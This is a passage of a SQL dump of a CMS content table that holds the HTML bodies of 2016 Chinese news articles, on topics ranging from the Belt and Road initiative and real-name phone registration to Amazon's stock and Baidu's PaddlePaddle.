style=\"text-indent: 2em;\"><strong>“一带一路”这三年</strong></p><p style=\"text-indent: 2em;\"><strong><br/></strong></p><p style=\"text-indent: 2em;\">三年，筚路蓝缕，春华秋实。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">在“一带一路”倡议提出的当年11月，十八届三中全会通过的《中共中央关于全面深化改革若干重大问题的决定》明确指出：“加快同周边国家和区域基础设施互联互通建设，推进丝绸之路经济带、海上丝绸之路建设，形成全方位开放新格局。”</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">2014年11月的中央财经领导小组第八次会议专门研究了丝绸之路经济带和21世纪海上丝绸之路规划，发起建立亚洲基础设施投资银行和设立丝路基金。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">在博鳌亚洲论坛2015年年会上，习近平呼吁各国积极参与“一带一路”建设。随后，中国政府发布《推动共建丝绸之路经济带和21世纪海上丝绸之路的愿景与行动》，明确了“一带一路”的共建原则、框架思路、合作重点、合作机制等。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">2016年3月，国家“十三五”规划纲要正式发布，“推进‘一带一路’建设”成为其中专门一章。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">2016年8月，习近平在推进“一带一路”建设工作座谈会上，进一步提出8项要求。从统一思想到统筹落实，从金融创新到人文合作，从话语体系建设到安全保障，面面俱到。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">三年，蓝图由草创到一步步展开、一笔笔绘就。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">目前，已有100多个国家和国际组织参与到“一带一路”建设中来，中国同30多个沿线国家签署了共建合作协议、同20多个国家开展了国际产能合作，联合国等国际组织也态度积极，以亚投行、丝路基金为代表的金融合作不断深入，一批有影响力的标志性项目逐步落地。“一带一路”建设从无到有、由点及面，进度和成果超出预期。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">“一带一路”东联亚太经济圈，西接欧洲经济圈，跨越高山深海，正在逐步构建世界上最壮美的经济走廊。</p>', null, null, null);
INSERT INTO `jc_content_txt` VALUES ('28', '<p style=\"text-indent: 2em;\">9月21日，上海浦东机场，犯罪嫌疑人刘某被上海警方从马来西亚押送回沪。警方供图</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">骗税3400万，潜逃境外3100多天，辗转日本、马来西亚等地。经过上海警方漫长的追捕，2016年9月21日上午，国际红色通缉令出逃人员刘某被缉捕归案，押送回沪。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">澎湃新闻从上海警方获悉，近期“猎狐”行动捷报频传。8月22日，涉嫌巨额诈骗的国际红通犯罪嫌疑人钱某潜逃17年后被警方从南美国家苏里南劝返；8月31日，利用证券账户开设“老鼠仓”牟利、涉案金额高达1.2亿元的犯罪嫌疑人刘某被警方从美国劝返。至此，今年上海警方已经成功缉捕或劝返境外在逃人员71人。</p>', null, null, null);
INSERT INTO `jc_content_txt` VALUES ('29', '<p style=\"text-align: center;\"><img src=\"/u/cms/www/201609/230906198i4y.jpeg\" title=\"qe.jpeg\" alt=\"qe.jpeg\"/></p><p><br/></p><p style=\"text-indent: 2em;\">新华社深圳9月22日专电（记者孙飞）记者22日从深圳市公安局福田分局获悉，深圳数名二手房卖主，因房价上涨不愿履行协议与买家发生纠纷，并对深圳市中院相关判决不满，聚集60余人前往深圳市中院闹访。目前，5人因涉嫌聚众冲击国家机关罪被福田警方依法刑事拘留，并于9月14日由福田区人民检察院批准逮捕。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">深圳福田警方介绍，今年8月22日上午，在马某某（男，31岁，江西吉安人）、郑某某（男，47岁，广东深圳人）等人带领下，60余人拒不接受现场工作人员安检的要求，冲入深圳市中级人民法院一楼东大厅，扰乱深圳市中级人民法院的单位秩序。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">深圳福田警方接报后，组织警力赶到现场。在深圳市公安局统一指挥下，罗湖区、南山区公安分局警力也赶到现场支援处置工作。通过多方合力，62人被带离深圳中院。民警在现场收缴了大量标语横幅及文化衫等物品。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">深圳福田警方通报称，经查，该案系马某某、郑某某等二手房卖主，在签订二手房买卖协议后因房价上涨不愿履行协议引发纠纷，并对深圳市中院的相关判决不满，带领从东莞雁田等地雇佣的40余人前往深圳中院闹访。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">当日，深圳警方对这62人给予行政处罚，其中，56人分别被处以5至15日行政拘留，6人被处以罚款。后经进一步侦查，马某某、郑某某等5人因涉嫌聚众冲击国家机关罪被深圳福田警方依法刑事拘留，并于9月14日由福田区人民检察院批准逮捕。目前，该案尚在进一步侦办中。</p><p><br/></p>', null, null, null);
INSERT INTO `jc_content_txt` VALUES ('30', '<p style=\"text-indent: 2em;\">中新网北京9月23日电 (吴涛)中新网从三大运营商处获悉，此前传北京地区未实名手机用户10月15日将被停机，实际是分批执行，10月15日开始，最晚至10月31日截止。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">其实，多地已开始执行不实名就停机政策，中新网(微信公众号：cns2012)对此进行了梳理，大部分地区都是分批执行，如用户在规定时间内未实名，将面临被停机甚至销号的处理。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\"><strong>北京10月底前手机全部实名 否则停机</strong></p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">最近不少手机用户都收到通知，未实名手机用户将被停机。以北京为例，提示短信显示，10月15日起，未实名手机用户将被暂停通信服务。三大运营商相关负责人分别对中新网表示，在北京地区，10月15日起将执行非实名就停机政策，分批执行，最晚至10月底，非实名手机用户全部停机。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">至于其他省份，三大运营商表示，电信运营商省公司可以结合本地实际情况确定执行不实名就停机政策的具体日期。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">中国电信强调，地方分公司提出执行不实名就停机政策的时间节点，不得晚于集团提出的时间节点；中国移动表示，各省通信管理局或当地政府有规定的，优先按当地的规定执行。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">一些地方对手机实名补登记早就出了要求，江苏三家运营商按照省通信管理局要求，于7月22日发布公告称，自11月起暂停未实名手机用户的部分通信服务，12月起，停止仍未实名用户的全部通信服务。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">7月份，山东省公安厅和省通信管理局联合发布通告，自10月起暂停未实名用户的部分通信服务，2017年6月30日前，停止仍未实名用户的全部通信服务。</p>', null, null, null);
INSERT INTO `jc_content_txt` VALUES ('32', '<p style=\"text-align: center;\"><img src=\"/u/cms/www/201609/230919031knf.jpg\" title=\"138678572.jpg\" alt=\"138678572.jpg\"/></p><p><br/></p><p style=\"text-indent: 2em;\">成龙捐给台北故宫(微博)南院的12生肖兽首，面临斩首命运。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">中国台湾网9月22日讯 据台湾《联合报》报道，台北故宫院长林正仪今天（22日）表示，9月底将移除影星成龙捐赠台北故宫南院的12生肖兽首。对此，成龙经纪人EMMA傍晚传达成龙的意见表示，当初捐兽首给台北故宫，是因为台北故宫是一个“尊重文明，保护文化”的单位，若台北故宫对于“尊重文明，保护文化”有不同态度，“那我们也尊重”。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">成龙捐赠给台北故宫南院的12生肖兽首复制品，目前放置在台北故宫南院主建筑物外广场。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">EMMA指出，成龙将兽首捐给台北故宫时，想表达的“尊重文明 保护文化”的态度已经完成，“这整件事是一个态度传达的艺术行为”。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">据报道，成龙也曾捐赠一组相同的兽首给新加坡国立亚洲文明博物馆。EMMA指出，成龙捐赠兽首，捐给台北故宫和捐给新加坡国立亚洲文明博物馆，传达的态度是一样的，就是“尊重文明，保护文化”。“我们捐的不是艺术品或工艺品，而是传达一个态度。”捐给台北故宫，是因为它是一个“尊重文明，保护文化”的单位。若台北故宫对于“尊重文明，保护文化”有不同态度，“那我们也尊重”。</p>', null, null, null);
INSERT INTO `jc_content_txt` VALUES ('33', '<p style=\"text-align: center;\"><img src=\"/u/cms/www/201609/23092247x1xp.jpg\" title=\"138679618.jpg\" alt=\"138679618.jpg\"/></p><p><br/></p><p style=\"text-indent: 2em;\">亚马逊季度利润连续三个财季创下新纪录。随之而来的是，亚马逊股价也打破了记录。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">亚马逊的股价在纽约当地时间周四上午首次突破每股800美元大关。亚马逊以3860亿美元的市值稳居全球上市公司第四的位置，仅次于苹果、谷歌(微博)母公司Alphabet和微软。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">在过去的仅仅七个月时间里，亚马逊的股价大涨了40%。推动亚马逊股价增长的主要原因是亚马逊云计算业务AWS的增长及其带来的惊人利润。另外，亚马逊数千万Prime会员也贡献颇多，这些会员要比非会员更经常购物，而且购物支出也比非会员要多得多。</p>', null, null, null);
INSERT INTO `jc_content_txt` VALUES ('36', '<p style=\"text-align: center;\"><img src=\"/u/cms/www/201609/230939278x02.jpg\" title=\"138679965.jpg\" alt=\"138679965.jpg\"/></p><p><br/></p><p style=\"text-indent: 2em;\">9月20日，匹凸匹投资者索赔案开庭，有十多位投资者向匹凸匹发起索赔。今年3月，匹凸匹公告，因未及时披露多项对外重大担保、重大诉讼事项及2013年年报中未披露对外重大事项，证监会对匹凸匹处40万元罚款，对鲜言处30万元罚款。前述投资者认为因虚假陈述行为而受到损失。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">事实上，这也是匹凸匹原实际控制人鲜言给“海银系”掌门人韩宏伟的遗留问题。去年底，“海银系”以五牛基金为主力从鲜言手中接盘饱受争议的匹凸匹。韩宏伟与韩啸系父子关系。大半年过去，韩氏父子与鲜言的关系也从起初的甜蜜期走到如今对簿公堂。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">对于有着同窗情谊的两者是真翻脸还是另有图谋，投资者更为关心的是，韩氏父子掌控的“海银系”对匹凸匹未来发展有怎样的考虑，是否会注入资产让匹凸匹改头换面，而不是再次陷入“资本漩涡”。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\"><strong>实控人背后关联重重</strong><br/></p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">在资本市场叱咤风云的“海银系”为何要染指匹凸匹。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">近三年来，匹凸匹（原多伦股份）及鲜言在资本市场可谓劣迹斑斑，先后被证监会两次立案调查、两次公开谴责，1次警告、1次罚款，1次行政监管，并多次收到上交所的问询函。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">对于上海一中院开庭审理的十多位投资者诉匹凸匹案，上述投资者的代理律师上海市华荣律师事务所许峰对中国证券报记者表示，通过庭审判断，投资者最终获赔概率较大。其法律依据主要是，去年年底证监会针对匹凸匹未及时披露多项对外重大担保、重大诉讼事项做出了处罚。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">事实上，7月份，中证中小投资者服务中心代理散户起诉匹凸匹，将鲜言及原其他七名高管及匹凸匹公司作为共同被告诉至法院，诉请判令鲜言赔偿经济损失37万余元，其余八被告承担连带赔偿责任。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">有投行人士还对中国证券报记者透露，2014年11月底，鲜言拟将上市公司实际控制权转让给自然人殷群，最终因对方未付款而夭折。在五牛基金入主匹凸匹之前，资本大鳄吴鸣霄也与鲜言谈过买壳，但最终不知为何没有谈拢。值得注意的是，目前颇受关注的ST慧球(13.300, 0.01, 0.08%)第一大自然人股东就是吴鸣霄，而ST慧球被指背后的实际控制人是鲜言。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">上述人士指出，在历经陈隆基、李勇鸿、鲜言的多次进进出出。多伦股份主营业务变更不断，从房地产、金融又回到房产，唯一不变的是业绩不见起色，并一步步走向“空壳”状态。</p>', null, null, null);
INSERT INTO `jc_content_txt` VALUES ('37', '<p style=\"text-align: center;\"><img src=\"/u/cms/www/201609/23094218axhy.jpg\" title=\"138679463.jpg\" alt=\"138679463.jpg\"/></p><p><br/></p><p style=\"text-indent: 2em;\">近日，美国联邦通信委员会意外曝光了苹果正在研发的一款新设备，其体积类似于苹果机顶盒（Apple TV），具体的用途尚不得而知。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">据美国科技新闻网站AppleInsider报道，联邦通信委员会的数据库中出现了这款苹果尚未对外宣布的新产品，其螺丝位置和设备外壳的大小，类似于第四代苹果机顶盒。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">苹果一直拥有对外保密的传统，而在这款新设备中，苹果也要求不对外泄漏相关信息，因此媒体无法判断到底作何用途。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">这款设备使用的型号A1844，目前并未被苹果发售的商品使用过。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">据称，该设备的电源参数为5.5V到13.2V,输出电流为100毫安，峰值为700毫安。这些参数有别于苹果最新的机顶盒，其电源参数为12V、920毫安。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">这款设备还具有蓝牙通信和NFC（近场通信）功能，美国联邦通信委员会也对这些通信功能进行了测试，相关的无线电通信功能也是这款设备提交到该机构进行测试的原因。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">这一设备没有进行Wi-Fi通信测试，可能意味着会采用目前某个设备的Wi-Fi通信技术，或者根本就不具备Wi-Fi通信功能。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">此前，外部机构曾经对苹果第四代机顶盒进行过拆解，相关的螺丝位置，和此次对外披露的设备有类似之处。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">近些年，苹果的研发资源集中在了智能手机、平板电脑等领域，传统的机顶盒似乎受到了冷落。去年，在长期不更新之后，苹果推出了全新第四代的机顶盒，苹果推出了专有的机顶盒操作系统，在遥控器中植入了语音操控工具Siri。库克也表示，电视的未来是应用软件。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">苹果也围绕机顶盒构建了一个客厅互联网的生态系统，许多第三方开发商正在为苹果机顶盒开发电视端的应用软件。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em; text-align: center;\"><img src=\"/u/cms/www/201609/230943156ihf.jpg\" title=\"138679317.jpg\" alt=\"138679317.jpg\"/></p><p style=\"text-indent: 2em; text-align: center;\">第四代苹果机顶盒</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">此次披露的设备，是否是未来第五代的苹果机顶盒，仍无法判断。</p>', null, null, null);
INSERT INTO `jc_content_txt` VALUES ('39', '<p style=\"text-align: center;\"><img src=\"/u/cms/www/201609/230954058tco.jpg\" title=\"138678243.jpg\" alt=\"138678243.jpg\"/></p><p><br/></p><p style=\"text-indent: 2em;\">中国地震台网正式测定：09月23日00时47分在四川甘孜州理塘县（北纬30.09度，东经99.64度）发生4.9级地震，震源深度19千米。</p>', null, null, null);
INSERT INTO `jc_content_txt` VALUES ('111', '<p style=\"text-align: center;\"><img src=\"/u/cms/www/201610/10114510l7x1.jpg\" title=\"138683743.jpg\" alt=\"138683743.jpg\"/></p><p><br/></p><p style=\"text-indent: 2em;\">本月初的百度世界大会上，百度正式对外宣布，开源其深度学习平台PaddlePaddle，这也让百度成为国内首家开放深度学习技术平台的科技公司。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">徐伟表示，百度希望通过开放深度学习平台的方式，营造开发者社区，推动人工智能行业的发展。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">据徐伟介绍，该平台最初是百度研发的深度学习内部平台，项目于2013年启动，主要用于支持的百度产品，目前百度有超过30个产品应用到该深度学习平台，包括预测外卖送达时间、图文问答、商家好感度模型等。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">在行业开放的大趋势下，百度决定将这一平台开源，现在所有的从事深度学习开发的开发人员均可以下载安装并使用百度的这一深度学习工具。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">除了百度以外，谷歌(微博)在去年底宣布开放其深度学习平台Tensorflow，此外，业内主流的深度学习平台还包括Facebook的Torch，加州伯克利大学的Caffe等。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">徐伟说，百度的PaddlePaddle平台具备易用、高效、灵活、可伸缩等特点，能够满足多种不同的应用开发需求。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">在接受采访时，徐伟重点强调了该平台的易用性特征，他表示，相比谷歌的Tensorflow来说，开发者在使用PaddlePaddle时更容易上手，尤其是对于序列输入、稀疏输入和大规模数据的模型训练有着良好的支持，支持GPU运算、数据并行和模型并行，仅需少量代码就能训练深度学习模型，大大降低了用户使用深度学习技术的成本。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">徐伟说，让开发者决定使用哪个平台进行开发的决定因素主要包含几个方面，首先是该平台能否实现自己想实现的功能，其次是使用某平台实现起来的难度有多大，最后是效率有多高。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">本月底，PaddlePaddle将迎来开源后的首次重大更新，徐伟介绍称，此次更新主要是进一步完善对不同操作系统的支持、进一步完善说明文档以及解决不同安全环境下的问题等。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">百度开源人工智能技术引起了开发者社区的关注，Facebook深度学习研究员、曾参与谷歌Tensorflow研发的贾扬清评价称，PaddlePaddle有高质量的GPU代码、非常好的RNN（回归神经网络）设计，并且设计很干净，没有太多的抽象表达，这一点比Tensorflow好很多。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">徐伟表示，正式开源后，下一步的目标是进一步完善平台的易用性和性能，并增强与开发者群体的沟通，了解他们的需求。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">在谈到人工智能行业的发展时，他认为，人工智能行业这两年出现爆发式增长，主要在语音识别、图像识别等领域出现了显著的突破。在谈到人工智能未来发展时，他表示乐观，并认为，未来可能的突破点在于自然语言识别、理解和处理以及机器翻译等方面，另外基于人工智能的”人工助手”的智能化程度也有望进一步加强。</p><p><br/></p>', null, null, null);
INSERT INTO `jc_content_txt` VALUES ('112', '<p style=\"text-align: center;\"><img src=\"/u/cms/www/201610/10114715p0as.jpg\" title=\"138679801.jpg\" alt=\"138679801.jpg\"/></p><p><br/></p><p style=\"text-indent: 2em;\">自2013年12月首批企业获牌以来，虚拟运营商发展迅速，目前已有42家企业获得牌照。9月22日，在“ICT中国· 2016高层论坛”移动转售分论坛上，中国通信企业协会披露，目前移动转售业务用户数已超3500万，占全国移动用户人数2.67%。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">不过，移动转售行业也因实名制未落实到位出现诸多“乱象”，尤其“170”号段诈骗多发遭诟病，在“徐玉玉受骗致死”案等多个热点事件的舆论声讨中，虚拟运营商声誉受到重大打击，其融资也受到影响。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\"><strong>虚拟运营商“很受伤”</strong></p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">3年前，第一批企业获得牌照进入试点，中国移动(微博)虚拟运营业方缓缓起步，而经过几年的发展，这一行业已小有规模，不过“成长的烦恼”也使其备受困扰。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">中国通信企业协会披露的数据显示，移动转售业的发展速度有所下降。自2015年3月起，移动通信转售业务月净增超过100万户，其中2015年10月起连续6个月净增达到200万，然而自2016年1月以来，增速有所放缓，甚至出现“停滞”。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">增速降低与行业乱象不无关联。女大学生徐玉玉被骗后昏聩致死使得社会的目光投向虚拟运营商，尤其是因为“实名制”再次被推上风口浪尖。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">据央广网2016年8月报道，工信部网络安全管理局对虚拟运营商新入网电话用户实名登记工作暗访，暗访的26家转售企业的109个营销网点中，37个网点存在违规行为，违规占比超三成。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">虚拟运营商“实名制”漏洞也成了舆论谴责的“靶子”。中兴视通显然备受折磨，其CEO邓慕超向与会者“倒苦水”，称自己有时“夜不能寐、梦不能求”。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">巴士在线CEO王献蜀在业内摸爬滚打多年，也叫苦不迭，“170贴了一个标签，就是诈骗，虚商也变成了诈骗公司。”王献蜀表示，这让虚拟运营商要“很受伤”，并呼吁业内外应给予虚拟运营商“容错空间”。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\"><strong>声誉受损融资受波及</strong></p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">中国虚拟运营业起步晚于发达国家，而虚拟运营商们盈利困难早已不是新闻，而今，命途多舛的它们又遇“拦路虎”，这也让资本市场对其发展前景打了个问号，虚拟运营商直接受到冲击。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">王献蜀称，“170”号段的问题影响了虚拟运营的融资。“我们很少听到说哪一家虚商拿了多少融资，然后怎么样，多么风光，虚商这个行业几乎都是每一家虚商，每一个老板，每一个企业真金白银自己从口袋里面往外掏钱。”王献蜀表示，从业几年来，他自己已经投入了1.8亿元。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">蜗牛移动CEO陈艳也深有体会，在她看来，虚拟运营商还是个“婴儿”，她表示，英国发展虚拟运营已有18年，虚拟运营的比例占到全行业的12%，而中国发展2、3年达到2.67%，未来还有很大发展空间，但她却感受到了行业内的恐慌。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">融资困境及舆论压力促进了虚拟运营商的反思。9月22日的论坛上，虚拟运营企业代表均坦承，虚拟运营商也是诈骗案的受害者，落实实名制可促使虚拟运营业健康发展。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">今年4月份，工信部发布了《关于加强规范管理，促进移动通信转售业务健康发展》的通知，向移动转售企业提出了落实移动用户实名登记要求的有关具体规定。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">据中国通信企业协会常务副会长兼秘书长苗建华介绍，整治以来，虚拟运营商采用系统整改、完善手段、有奖举报等一系列措施取得了一定的成效。</p><p><br/></p>', null, null, null);
INSERT INTO `jc_content_txt` VALUES ('113', '<p style=\"text-align: center;\"><img src=\"/u/cms/www/201610/10114919rtom.jpg\" title=\"641.jpg\" alt=\"641.jpg\"/></p><p><br/></p><p style=\"text-indent: 2em;\">李克强总理首赴联合国，首场活动便是出席由联合国倡议举行的联大解决难移民大规模流动问题高级别会议。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">这是自联合国成立以来，首次召开的应对难移民问题的高级别会议。同时尤其值得注意的是，这也是中国领导人首次在此种国际场合阐述对于难移民问题的主张。总理的首场与联合国的首次，两者碰撞出怎样的火花?</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">人道主义的价值观，这是李克强主张的要旨。在联合国的讲台上，中国总理的视野超越国别和地域。他将难民和移民问题视为一场“拷问人类社会良知”的人道主义危机，因此郑重向国际社会发出呼吁：“每一个人的生命都是宝贵的，每一个人的尊严都应得到维护，人道主义精神必须弘扬。”中国传统政治伦理中有着人道主义的丰沛思想资源，李克强将其带到联合国讲台上，从而丰富了中国当代外交与政治的实践。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">与此相应，在联合国这个庄严的讲台上，李克强代表中国宣布的3项举措，实打实地彰显了基于人道主义的国际政治理念。中国将这样做：在原有援助规模的基础上，向有关国家和国际组织提供1亿美元的人道主义援助;积极研究把中国-联合国和平与发展基金的部分资金用于支持发展中国家难民移民工作;积极探讨同有关国际机构和发展中国家开展三方合作。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">怎么做，真金白银，某种意义上比怎么说更触及实质。然而这里面有一个厘清“责任观”的问题。中国作为联合国常任理事国，在难移民这一全球性议题上当然有义不容辞的责任。该出手时就出手，正如李克强在当天会议上所言，中国把人道主义援助视为“道义之举”。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">同时，中国经济虽有了很大发展，但仍是发展中国家，愿意承担与自身能力相适应的责任。李克强在联合国所承诺的援助资金，是中国的量力而为，我们决不放空炮;所承诺的援助方式，比如使用和平与发展基金的部分资金、开展三方合作等，也是真正的“务实之举”。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">更关键的是，李克强的“说”与“做”，在一个更高层面上实现了统一，那就是发展。战乱冲突、贫穷落后是难移民问题的主要根源，实现真正的包容性增长方为治本之策。中国的主张和举措，牢牢把握住了解决问题最关键点——长远和根本地看，出路还蕴藏在发展这一主题中。这也是李克强一直以来在国际外交舞台上所强调的，以发展弥合伤痕、促进平衡、共同向前。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">在联合国的首场活动，阐述理念、承诺硬招，李克强总理在这个最高的国际场合，展示了中国“软实力”。</p><p><br/></p>', null, null, null);
INSERT INTO `jc_content_txt` VALUES ('130', '<p style=\"text-indent: 2em;\">细心的人会观察到，在发表2016年新年贺词的镜头中，习近平总书记办公室有了新变化：新添的7张照片中，有3张记录着总书记和民族地区各族干部群众一起谋发展、话小康的难忘瞬间。</p><p style=\"text-indent: 2em;\"><br/></p><p>　　民族工作关乎大局。党的十八大以来，以习近平同志为总书记的党中央高度重视民族工作，多次深入民族地区调研，体察少数民族群众冷暖。先后召开第二次中央新疆工作座谈会、中央民族工作会议、中央第六次西藏工作座谈会等，对民族工作作出全面部署，力度之大、频次之高、涉面之广、阐述之深，前所未有，一曲新形势下民族工作新乐章在中华大地奏响。</p><p><br/></p><p>　　保持定力：坚持走中国特色解决民族问题的正确道路</p><p><br/></p><p>　　2014年9月，中央民族工作会议在京召开。会上，习近平总书记在坚持党的民族理论政策基本原则的基础上，提出了一系列新思想新观点新举措，为新形势下民族工作提供了行动指南和基本遵循：</p><p><br/></p><p>　　——我国历史演进的这个特点，造就了我国各民族在分布上的交错杂居、文化上的兼收并蓄、经济上的相互依存、情感上的相互亲近，形成了你中有我、我中有你、谁也离不开谁的多元一体格局。</p><p><br/></p><p>　　——新中国成立65年来，党的民族理论和方针政策是正确的，中国特色解决民族问题的道路是正确的，我国民族关系总体是和谐的。</p><p><br/></p><p>　　——同世界上其他国家相比，我国民族工作做得都是最成功的。</p><p><br/></p><p>　　——中华民族和各民族的关系，形象地说，是一个大家庭和家庭成员的关系，各民族的关系是一个大家庭里不同成员的关系。</p><p><br/></p><p>　　——坚持中国特色解决民族问题的正确道路。</p><p><br/></p><p>　　——坚持和完善民族区域自治制度，要做到坚持统一和自治相结合，坚持民族因素和区域因素相结合。</p><p><br/></p><p>　　——做好民族工作，最关键的是搞好民族团结，最管用的是争取人心。</p><p><br/></p><p>　　——城市民族工作要把着力点放在社区，推动建立相互嵌入式的社会结构和社区环境。</p><p><br/></p><p>　　——加强中华民族大团结，长远和根本的是增强文化认同，建设各民族共有精神家园，积极培养中华民族共同体意识。</p><p><br/></p><p>　　——尊重差异、包容多样，通过扩大交往交流交融，创造各族群众共居、共学、共事、共乐的社会条件，让各民族在中华民族大家庭中手足相亲、守望相助。</p><p>　　……</p><p>　　中央民族工作会议的召开，统一思想、坚定信心，在新的历史起点上推动民族团结进步事业踏上新的时代征程。</p><p><br/></p><p>　　大政方针已定，关键就在落实。中央民族工作会议以来，以理论创新为先导，民族工作的政策创新、制度创新、实践创新不断推进。</p><p><br/></p><p>　　——出台贯彻落实《中共中央、国务院关于加强和改进新形势下民族工作的意见》的重要举措分工方案，包括16项47条，条条都是硬举措。相关部委组成联合督查组督促中央民族工作会议精神的贯彻落实。</p><p><br/></p><p>　　——时隔13年召开全国民族教育工作会议，首次召开全国城市民族工作会议……中央民族工作会议精神逐一贯彻，渐次落实。</p><p><br/></p><p>　　——全国31个省、自治区、直辖市和新疆生产建设兵团相继召开贯彻落实中央民族工作会议精神的会议，出台了相关配套文件。</p><p><br/></p><p>　　——为支持民族地区加快发展，输送“真金白银”，研究制定差别化政策：第一次对川甘青交界地区，对南疆四地州，对怒江、凉山、临夏等三个特困自治州，专门制定政策举措。</p><p><br/></p><p>　　——明确少数民族学生高考加分政策，对国家通用语言文字已经普及、教育水平大体相同的地区，逐步缩小差距，逐步做到一律平等；对语言文化差异较大、教育质量还不高的一些地区少数民族学生，除大力普及双语教育、调整专业设置、提高教学质量外，仍是实行高考加分政策，支持少数民族学生取得较好教育水平。</p><p><br/></p><p>　　